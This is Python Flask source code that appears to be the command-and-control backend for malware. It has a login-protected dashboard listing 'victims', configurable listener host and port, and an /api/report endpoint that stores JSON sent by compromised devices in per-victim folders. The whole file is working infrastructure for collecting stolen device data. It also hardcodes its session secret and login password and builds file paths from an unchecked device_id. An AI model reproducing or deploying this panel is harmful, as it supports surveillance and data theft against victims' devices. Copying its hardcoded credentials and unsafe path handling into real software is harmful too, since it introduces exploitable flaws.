
from flask import Flask, render_template, request, redirect, session, jsonify
import os, json

app = Flask(__name__)
app.secret_key = 'kader11000'

CONFIG_FILE = 'config.json'
SESSIONS_FOLDER = 'sessions'

def load_config():
    with open(CONFIG_FILE) as f:
        return json.load(f)

def save_config(data):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(data, f)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('password') == 'kader11000':
            session['logged_in'] = True
            return redirect('/dashboard')
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'):
        return redirect('/')
    victims = os.listdir(SESSIONS_FOLDER)
    return render_template('dashboard.html', victims=victims)

@app.route('/settings', methods=['GET', 'POST'])
def settings():
    if not session.get('logged_in'):
        return redirect('/')
    config = load_config()
    if request.method == 'POST':
        config['host'] = request.form['host']
        config['port'] = int(request.form['port'])
        save_config(config)
        return redirect('/settings')
    return render_template('settings.html', config=config)

@app.route('/api/report', methods=['POST'])
def report():
    data = request.json
    victim_id = data.get('device_id')
    folder = os.path.join(SESSIONS_FOLDER, "victim_" + victim_id)
    os.makedirs(folder, exist_ok=True)
    with open(os.path.join(folder, 'info.json'), 'w') as f:
        json.dump(data, f, indent=2)
    return jsonify({'status': 'saved'})

if __name__ == '__main__':
    config = load_config()
    app.run(host=config['host'], port=config['port'])
